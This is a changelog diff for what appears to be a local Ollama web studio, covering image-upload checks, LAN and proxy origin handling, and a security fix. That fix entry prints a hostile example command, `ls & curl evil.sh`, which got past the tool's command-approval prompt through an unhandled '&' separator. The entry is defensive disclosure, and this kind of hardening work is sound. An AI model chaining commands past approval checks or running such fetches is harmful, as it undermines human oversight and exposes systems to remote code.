@@ -2,6 +2,17 @@
 
 ## Unreleased
 
+### Image attachments
+
+- **Fix:** one damaged, cut-off or mislabelled picture (e.g. an interrupted phone upload) made Ollama answer `400 Failed to load image or audio file` on every later request, because the last 4 images are re-sent each time. Pictures are now checked (signature, PNG/JPEG end marker) when attached and before every send; bad ones fall back to vision-model/OCR/path mode with a note.
+- **Fix:** if Ollama still reports it cannot load an image, the turn is retried once without pictures (the model is told) instead of failing.
+- **Fix:** an upload that arrives shorter than its `Content-Length` is rejected instead of stored.
+
+### LAN / proxy access
+
+- **Fix:** uploads (and other API calls) from a browser on another device of the LAN, or through a proxy/tunnel, were refused as "cross-site" when `Origin`, `Host` or `Sec-Fetch-Site` did not line up. The UI now sends `X-Studio-Client: web` on every same-origin request (`public/net.js`); the guard treats it as proof of a same-origin script (browser-enforced via CORS preflight), while the token, Host and JSON-only rules stay in force.
+- **New:** `--allow-origin URL` / `OLLAMA_STUDIO_ALLOWED_ORIGINS` for clients without that header behind a proxy; `X-Forwarded-Host` is honoured; the 403 message names the Origin/Host pair. `/api/shutdown` uses the same rule.
+
 ### Security hardening (round 2)
 
 - **Fix (critical):** a single `&` was not treated as a command separator, so `ls & curl evil.sh` ran without asking. The splitter is now quote-aware and fails safe (unterminated quotes, `$'…'`, substitutions, redirects always ask).
